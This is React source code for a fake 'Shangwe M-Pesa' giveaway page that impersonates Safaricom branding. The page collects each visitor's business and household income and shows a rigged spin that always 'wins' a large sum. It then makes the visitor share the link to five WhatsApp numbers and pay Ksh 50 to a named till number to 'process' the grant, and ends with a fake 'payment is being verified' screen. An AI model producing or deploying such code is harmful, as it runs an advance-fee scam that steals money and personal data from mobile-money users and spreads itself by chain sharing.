import React, { useState } from 'react'
import safaricomLogo from './assets/safaricom_shangwe.png'

const amounts = [520000, 13000, 50000, 30000, 5000, 25000, 40000]

export default function App() {
  const [page, setPage] = useState(1)
  const [business, setBusiness] = useState('')
  const [income, setIncome] = useState('')
  const [won, setWon] = useState(null)

  const spin = () => {
    const result = amounts[Math.floor(Math.random() * amounts.length)]
    setWon(result)
    setPage(3)
  }

  return (
    <div className="flex flex-col items-center justify-center min-h-screen p-4 text-center">
      {page === 1 && (
        <div className="max-w-md">
          <img src={safaricomLogo} alt="Safaricom Shangwe" className="mx-auto w-40 mb-4" />
          <h1 className="text-2xl font-bold mb-2">Shangwe M-Pesa</h1>
          <p className="mb-4">Answer a few questions to begin</p>
          <input
            placeholder="What business do you have?"
            className="border p-2 w-full mb-2"
            value={business}
            onChange={e => setBusiness(e.target.value)}
          />
          <input
            placeholder="Household income (Ksh)"
            className="border p-2 w-full mb-4"
            value={income}
            onChange={e => setIncome(e.target.value)}
          />
          <button
            onClick={() => setPage(2)}
            className="bg-green-600 text-white px-4 py-2 rounded"
          >
            Continue
          </button>
        </div>
      )}

      {page === 2 && (
        <div>
          <h2 className="text-xl mb-4">Tap the button to spin 🎉</h2>
          <button
            onClick={spin}
            className="bg-green-600 text-white px-6 py-2 rounded-full"
          >
            Spin Now
          </button>
        </div>
      )}

      {page === 3 && (
        <div>
          <h2 className="text-2xl font-semibold mb-2">Congratulations!</h2>
          <p className="mb-4">You won Ksh {won.toLocaleString()} 🎊</p>
          <button
            onClick={() => setPage(4)}
            className="bg-green-600 text-white px-4 py-2 rounded"
          >
            Next
          </button>
        </div>
      )}

      {page === 4 && (
        <div>
          <h2 className="text-xl font-semibold mb-2">Share to proceed</h2>
          <p className="mb-4">
            Share this link to 5 WhatsApp numbers to continue: <br />
            <a
              href="https://github.com/kishcod/shangwe.git"
              target="_blank"
              className="text-blue-600 underline"
            >
              https://github.com/kishcod/shangwe.git
            </a>
          </p>
          <a
            href="https://api.whatsapp.com/send?text=Check%20out%20this%20Shangwe%20M-Pesa%20offer!%20https://github.com/kishcod/shangwe.git"
            target="_blank"
            className="bg-green-500 text-white px-4 py-2 rounded"
          >
            Share on WhatsApp
          </a>
          <div className="mt-6">
            <button
              onClick={() => setPage(5)}
              className="bg-green-600 text-white px-4 py-2 rounded"
            >
              Continue
            </button>
          </div>
        </div>
      )}

      {page === 5 && (
        <div>
          <h2 className="text-xl font-semibold mb-2">Payment Processing</h2>
          <p className="mb-4">
            Send <b>Ksh 50</b> via Lipa na M-Pesa Till <b>8160572</b> to process your grant.
          </p>
          <button
            onClick={() => setPage(6)}
            className="bg-green-600 text-white px-4 py-2 rounded"
          >
            I have paid
          </button>
        </div>
      )}

      {page === 6 && (
        <div>
          <h2 className="text-xl font-semibold mb-2">Thank you!</h2>
          <p>Your payment is being verified. Please wait for funds to be deposited.</p>
        </div>
      )}
    </div>
  )
}
